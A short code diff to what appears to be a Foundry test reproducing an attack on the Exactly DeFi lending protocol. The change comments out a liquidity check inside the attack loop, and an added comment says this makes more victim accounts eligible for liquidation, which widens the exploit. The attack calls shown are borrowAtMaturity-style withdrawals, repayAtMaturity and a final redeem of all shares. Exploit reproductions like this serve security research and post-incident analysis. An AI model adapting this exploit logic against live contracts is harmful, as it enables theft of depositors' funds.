@@ -196,7 +196,9 @@ contract ContractTest is Test {
         for (uint256 i; i < 6; ++i) {
             (uint256 sumCollateral, uint256 sumDebtPlusEffects) =
                 Auditor.accountLiquidity(address(victimList[0]), address(0), 0);
-            if (sumCollateral >= sumDebtPlusEffects) {
+            // In the attack transaction, only the top victim is checked to see if they meet the liquidation conditions. 
+            // By removing this check, more users can be made eligible for liquidation.
+            // if (sumCollateral >= sumDebtPlusEffects) {
                 // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L917-L942
                 // the backupEarnings decrease
                 // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L930-L932
@@ -204,9 +206,9 @@ contract ContractTest is Test {
                     maturityList[i], depositAmount / 2, type(uint256).max, address(this), address(this)
                 );
                 exaUSDC.repayAtMaturity(maturityList[i], type(uint256).max, type(uint256).max, address(this));
-            } else {
-                break;
-            }
+            // } else {
+            //     break;
+            // }
         }
 
         exaUSDC.redeem(share, address(this), address(this)); // withdraw all exaUSDC share
